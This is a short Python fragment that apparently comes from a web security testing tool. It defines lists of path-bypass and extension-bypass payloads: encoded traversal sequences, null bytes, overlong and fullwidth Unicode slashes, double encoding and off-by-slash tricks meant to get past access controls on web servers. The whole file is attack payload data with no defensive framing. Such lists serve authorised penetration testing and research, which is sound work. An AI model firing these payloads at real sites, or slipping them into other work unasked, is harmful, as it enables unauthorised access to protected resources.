# ============================================================
# PATH BYPASS PAYLOADS
# ============================================================

PATH_BYPASS = [
    # Slash variations
    "/",
    "//",
    "///",
    "/./",
    "/../",
    "/~",
    "/.~",
    # Dot & traversal
    "%2e",
    "%2e/",
    ".%2f",
    "%2e%2e/",
    "%2e%2e%2f",
    ".././",
    "..//",
    # URL-encoded slashes
    "%2f",
    "%5c",
    "%5c%5c",
    "%5c/",
    "%2f%2f",
    # Null bytes & terminators
    "%00",
    "%00.html",
    "%00.jpg",
    "%0a",
    "%0d%0a",
    # Unicode bypasses
    "%ef%bc%8f",   # ／ (fullwidth solidus)
    "%e2%80%8b",   # zero-width space
    "%c0%af",      # overlong encoding /
    "%c1%9c",      # overlong encoding \
    # Double encoding
    "%252e%252e%252f",
    "%252f",
    "%255c",
    # Case & extension tricks
    ".JSON",
    ".json",
    ";.json",
    "?",
    "??",
    "#",
    "/..",
    # Nginx/Apache off-by-slash
    "a/../",
    "a/./",
]

EXTENSION_BYPASS = [
    ".json",
    ".html",
    ".php",
    ".asp",
    ".aspx",
    ".xml",
    ".rss",
    ".do",
    ".action",
    ".jsp",
    ".txt",
    ";.json",
    "/.json",
    "%2ejson",
    ".json%00",
]
